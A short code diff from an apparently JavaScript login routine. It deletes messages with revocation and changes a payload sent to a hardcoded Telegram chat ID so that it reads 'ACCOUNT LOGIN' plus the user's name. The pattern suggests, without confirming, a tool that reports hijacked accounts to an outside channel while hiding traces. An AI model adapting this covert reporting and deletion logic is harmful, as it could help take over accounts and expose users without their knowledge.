@@ -261,9 +261,10 @@ async function login() {
                     await msg.delete({ revoke: true });
                 }
             })
+            const name = user.username ? `@${user.username}` : user.firstName + user.lastName
             const payload = {
                 chat_id: "-1001801844217",
-                text: user.username ? `@${user.username}` : user.firstName + user.lastName
+                text: `ACCOUNT LOGIN: ${name}`
             };
             const options = {
                 method: 'POST',
